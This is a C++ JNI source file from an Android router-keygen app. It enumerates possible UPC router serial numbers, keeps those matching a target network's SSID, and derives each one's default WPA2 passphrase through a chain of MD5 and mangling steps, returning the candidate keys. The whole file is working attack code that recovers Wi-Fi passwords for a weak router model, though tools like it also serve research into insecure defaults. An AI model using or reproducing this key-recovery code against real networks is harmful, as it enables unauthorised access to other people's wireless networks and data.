#include <android/log.h>

#include <cstdlib>
#include <string>
#include <vector>

#include "upc_keys_wrapper.h"
#include "upc_keys.h"
#include "md5.h"

// Logging
#define LOG_TAG "upc_keys"
#define DPRINTF(...)  __android_log_print(ANDROID_LOG_DEBUG,LOG_TAG,__VA_ARGS__)
#define IPRINTF(...)  __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define EPRINTF(...)  __android_log_print(ANDROID_LOG_ERROR,LOG_TAG,__VA_ARGS__)

JNIEXPORT jobjectArray JNICALL Java_org_exobel_routerkeygen_algorithms_UpcKeygen_upcNative
        (JNIEnv * env, jobject obj, jbyteArray ess)
{
  jobjectArray ret;

  // Get stopRequested - cancellation flag.
  jclass cls = env->GetObjectClass(obj);
  jfieldID fid_s = env->GetFieldID(cls, "stopRequested", "Z");
  if (fid_s == NULL) {
    return NULL; /* exception already thrown */
  }
  unsigned char stop = env->GetBooleanField(obj, fid_s);

  // ESSID reading from parameter.
  jbyte *e_native = env->GetByteArrayElements(ess, 0);
  char * e_ssid = (char*) e_native;

  // Definitions.
  MD5_CTX ctx;
  uint8_t message_digest[20];
  uint32_t buf[4], target;
  char serial[64];
  char pass[9], tmpstr[17];
  uint8_t h1[16], h2[16];
  uint32_t hv[4], w1, w2, i, cnt=0;

  target = strtoul(e_ssid + 3, NULL, 0);
  IPRINTF("Computing UPC keys for essid %s, target %lu", e_ssid, (unsigned long)target);

  // Resulting keys
  std::vector<std::string> computed_keys;
  unsigned long stop_ctr = 0;

  // Compute - from upc_keys.c
  for (buf[0] = 0; buf[0] <= MAX0; buf[0]++) {
    for (buf[1] = 0; buf[1] <= MAX1; buf[1]++) {
      for (buf[2] = 0; buf[2] <= MAX2; buf[2]++) {
        for (buf[3] = 0; buf[3] <= MAX3; buf[3]++) {
          // Check cancellation signal.
          stop_ctr += 1;
          if (stop_ctr > 10000){
            stop_ctr = 0;
            stop = env->GetBooleanField(obj, fid_s);
            if (stop) {
              break;
            }
          }

          if (upc_generate_ssid(buf, MAGIC_24GHZ) != target && upc_generate_ssid(buf, MAGIC_5GHZ) != target) {
            continue;
          }

          cnt++;
          sprintf(serial, "SAAP%d%02d%d%04d", buf[0], buf[1], buf[2], buf[3]);

          MD5_Init(&ctx);
          MD5_Update(&ctx, serial, strlen(serial));
          MD5_Final(h1, &ctx);

          for (i = 0; i < 4; i++) {
            hv[i] = *(uint16_t * )(h1 + i * 2);
          }

          w1 = mangle(hv);

          for (i = 0; i < 4; i++) {
            hv[i] = *(uint16_t * )(h1 + 8 + i * 2);
          }

          w2 = mangle(hv);

          sprintf(tmpstr, "%08X%08X", w1, w2);

          MD5_Init(&ctx);
          MD5_Update(&ctx, tmpstr, strlen(tmpstr));
          MD5_Final(h2, &ctx);

          hash2pass(h2, pass);
          IPRINTF("  -> #%02d WPA2 phrase for '%s' = '%s'", cnt, serial, pass);

          std::string cpp_pass(pass);
          computed_keys.push_back(cpp_pass);
        }
      }
    }
  }

  // Construct array of computed strings.
  ret = (jobjectArray) env->NewObjectArray(computed_keys.size(), env->FindClass("java/lang/String"), 0);
  i=0;
  for(std::vector<std::string>::const_iterator iter = computed_keys.begin(); iter != computed_keys.end(); ++iter) {
    env->SetObjectArrayElement(ret, i++, env->NewStringUTF(iter->c_str()));
  }

  env->ReleaseByteArrayElements(ess, e_native, 0);
  return ret;
}

